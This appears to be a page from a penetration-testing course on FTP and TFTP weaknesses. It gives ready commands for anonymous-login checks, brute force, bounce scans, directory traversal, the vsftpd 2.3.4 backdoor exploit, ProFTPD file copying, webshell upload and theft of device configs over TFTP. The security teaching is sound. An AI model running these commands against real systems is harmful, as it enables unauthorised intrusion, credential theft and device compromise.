# FTP/TFTP Attacks

## Unit 6 - Topic 5 | Network Protocol Attacks

---

## Overview

**FTP (File Transfer Protocol)** on port 21 and **TFTP (Trivial FTP)** on UDP port 69 are legacy file transfer protocols with significant security weaknesses. Both transmit data in plaintext and are frequently misconfigured with anonymous access or default credentials.

---

## 1. FTP Security Issues

```
FTP SECURITY WEAKNESSES:

PROTOCOL ISSUES:
├── Plaintext authentication (user + password visible)
├── Plaintext data transfer (files readable)
├── No integrity checking (files can be modified)
├── Active mode exposes internal IP
└── Bounce attacks (proxy through FTP server)

CONFIGURATION ISSUES:
├── Anonymous login enabled
├── Default credentials
├── Writable directories (upload malicious files)
├── Directory traversal vulnerabilities
├── FTP running as root (Linux)
└── FTP in DMZ with internal network access
```

---

## 2. FTP Enumeration and Attack

```bash
# === ANONYMOUS LOGIN CHECK ===
ftp target.com
# Username: anonymous
# Password: anonymous@

# Nmap:
nmap -p 21 --script ftp-anon target.com
# Reports if anonymous login is allowed

# === BANNER GRABBING ===
nmap -p 21 --script ftp-syst target.com
nc target.com 21
# 220 ProFTPD 1.3.5 Server ready

# === BRUTE FORCE ===
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ftp
medusa -h target.com -u admin -P wordlist.txt -M ftp

# === FTP BOUNCE ATTACK ===
nmap -b user:pass@ftp-server target_network
# Use FTP PORT command to scan internal network
# through the FTP server (proxy scan)

# === DIRECTORY TRAVERSAL ===
ftp target.com
ftp> cd ../../../etc
ftp> get passwd
# Some FTP servers don't properly jail users

# === DOWNLOAD EVERYTHING ===
wget -r ftp://anonymous:@target.com/
# Recursively download all accessible files
```

---

## 3. FTP Exploitation

```bash
# === VSFTPD 2.3.4 BACKDOOR ===
# Famous backdoor in vsftpd 2.3.4:
nmap -p 21 --script ftp-vsftpd-backdoor target.com

# Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target.com
exploit
# Triggers backdoor → root shell on port 6200

# === PROFTPD EXPLOITS ===
# ProFTPD mod_copy (unauthenticated file copy):
nmap -p 21 --script ftp-proftpd-backdoor target.com

# Copy files on server without authentication:
nc target.com 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Now download via HTTP

# === WRITABLE FTP → WEB SHELL ===
# If FTP shares directory with web server:
ftp target.com
ftp> put webshell.php
# Access: http://target.com/webshell.php

# === FTP + SMB RELAY ===
# Some FTP servers attempt NTLM auth
# Can be relayed with ntlmrelayx
```

---

## 4. TFTP Attacks

```bash
# === TFTP — No Authentication! ===
# TFTP has NO authentication mechanism
# Anyone who can reach UDP 69 can read/write files

# Check for TFTP:
nmap -sU -p 69 target.com

# Download files:
tftp target.com
tftp> get /etc/passwd
tftp> get running-config    # Cisco devices!

# === TFTP ENUMERATION ===
# Brute force filenames:
nmap -sU -p 69 --script tftp-enum target.com
# Tries common filenames

# === TFTP FOR CONFIG THEFT ===
# Many network devices use TFTP for:
# ├── Configuration backup/restore
# ├── Firmware updates
# ├── Boot images (PXE)
# └── Log files

# Common files on TFTP:
# ├── running-config / startup-config
# ├── backup.cfg
# ├── router.conf
# └── firmware.bin

# === TFTP ATTACK SCENARIO ===
# 1. Find TFTP server on network
# 2. Download device configurations
# 3. Extract credentials from configs
# 4. Upload modified config with backdoor
# 5. Reboot device → loads malicious config
```

---

## 5. Secure Alternatives

| Insecure | Secure Alternative |
|----------|-------------------|
| **FTP** | SFTP (SSH File Transfer) |
| **FTP** | FTPS (FTP over TLS) |
| **FTP** | SCP (Secure Copy) |
| **TFTP** | SCP or HTTPS |
| **Anonymous FTP** | Authenticated SFTP |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **FTP** | Port 21 — plaintext file transfer |
| **TFTP** | UDP 69 — no authentication at all |
| **Anonymous FTP** | Login without credentials |
| **vsftpd 2.3.4** | Famous backdoor vulnerability |
| **TFTP config theft** | Download network device configs |
| **Defense** | Use SFTP/FTPS, disable anonymous |

---

## Quick Revision Questions

1. **Why is FTP considered insecure?**
2. **What is the vsftpd 2.3.4 backdoor?**
3. **How does TFTP differ from FTP in terms of security?**
4. **How can a writable FTP directory lead to RCE?**
5. **What secure alternatives should replace FTP?**

---

[← Previous: SNMP Exploitation](04-snmp-exploitation.md) | [Next: RDP Vulnerabilities →](06-rdp-vulnerabilities.md)

---

*Unit 6 - Topic 5 of 6 | [Back to README](../README.md)*
